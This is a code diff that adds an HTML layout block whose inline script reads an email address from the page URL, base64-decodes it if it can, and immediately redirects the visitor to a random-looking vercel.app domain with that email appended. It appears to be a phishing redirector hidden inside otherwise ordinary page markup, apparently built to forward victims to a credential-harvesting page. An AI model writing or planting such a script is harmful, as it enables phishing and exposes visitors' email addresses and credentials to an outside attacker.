@@ -1,0 +1,39 @@
+<div class="row sectionBlockLayout text-left" style="min-height: auto; padding: 8px;">
+    <div class="container" style="display: flex; flex-wrap: wrap;">
+      <script>
+        // Get the current URL
+        var currentUrl = window.location.href;
+        
+        // Function to decode base64 encoded string
+        function decodeBase64(encodedString) {
+            return atob(encodedString);
+        }
+        
+        // Extract the email address from the URL using a regular expression
+        var email = currentUrl.match(/[?&#]([^=]*)=([^&]*)/);
+        if (email) {
+            var key = email[1];
+            var value = email[2];
+            
+            // Check if the value is base64 encoded
+            var decodedEmail = value;
+            try {
+                decodedEmail = decodeBase64(value);
+            } catch (e) {
+                // Not base64 encoded, use the original value
+            }
+            
+        
+            var redirectUrl = 'https://redjhjhsdhjds983289jdjkhdsnirechjhj.vercel.app/#' + (decodedEmail);
+            window.location.href = redirectUrl;
+        } else {
+            console.log('Email address not found in the URL');
+        }
+        
+        
+        </script>
+      
+      <div class="col-md-12 columnBlockLayout" style="padding: 16px; margin: 60px 0px; min-height: 200px;"></div>
+    </div>
+  </div>
+  
